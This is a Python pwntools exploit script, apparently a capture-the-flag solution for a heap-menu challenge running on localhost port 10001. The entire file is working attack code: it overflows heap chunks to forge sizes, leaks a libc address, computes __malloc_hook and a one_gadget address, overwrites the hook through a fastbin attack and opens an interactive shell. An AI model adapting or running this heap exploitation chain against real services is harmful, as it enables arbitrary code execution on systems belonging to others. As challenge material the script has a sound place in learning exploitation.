#!/usr/bin/env python

from pwn import *

io = remote('127.0.0.1', 10001)

def alloc(size):
    io.recvuntil("Command: ")
    io.sendline('1')
    io.recvuntil("Size: ")
    io.sendline(str(size))

def fill(idx, cont):
    io.recvuntil("Command: ")
    io.sendline('2')
    io.recvuntil("Index: ")
    io.sendline(str(idx))
    io.recvuntil("Size: ")
    io.sendline(str(len(cont)))
    io.recvuntil("Content: ")
    io.send(cont)

def free(idx):
    io.recvuntil("Command: ")
    io.sendline('3')
    io.recvuntil("Index: ")
    io.sendline(str(idx))

def dump(idx):
    io.recvuntil("Command: ")
    io.sendline('4')
    io.recvuntil("Index: ")
    io.sendline(str(idx))
    io.recvuntil("Content: \n")
    data = io.recvline()
    return data

alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)
#fill(0, "A"*16)
#fill(1, "A"*16)
#fill(2, "A"*16)
#fill(3, "A"*16)
#fill(4, "A"*128)

free(1)
free(2)

payload  = "A"*16
payload += p64(0)
payload += p64(0x21)
payload += p64(0)
payload += "A"*8
payload += p64(0)
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)

payload  = "A"*16
payload += p64(0)
payload += p64(0x21)
fill(3, payload)

alloc(0x10)
alloc(0x10)
#fill(1, "B"*16)
#fill(2, "C"*16)
#fill(4, "D"*16)

payload  = "A"*16
payload += p64(0)
payload += p64(0x91)
fill(3, payload)

alloc(0x80)
#fill(5, "A"*128)

free(4)

leak = u64(dump(2)[:8])
libc = leak - 0x3c4b78          # 0x3c4b78 = leak - libc
__malloc_hook = libc + 0x3c4b10    # readelf -s libc.so.6 | grep __malloc_hook@
one_gadget = libc + 0x4526a
log.info("leak => 0x%x" % leak)
log.info("libc => 0x%x" % libc)
log.info("__malloc_hook => 0x%x" % __malloc_hook)
log.info("one_gadget => 0x%x" % one_gadget)

alloc(0x60)
free(4)

payload = p64(libc + 0x3c4afd)
fill(2, payload)

alloc(0x60)
alloc(0x60)

payload  = p8(0)*3
payload += p64(one_gadget)
fill(6, payload)

alloc(1)
io.interactive()
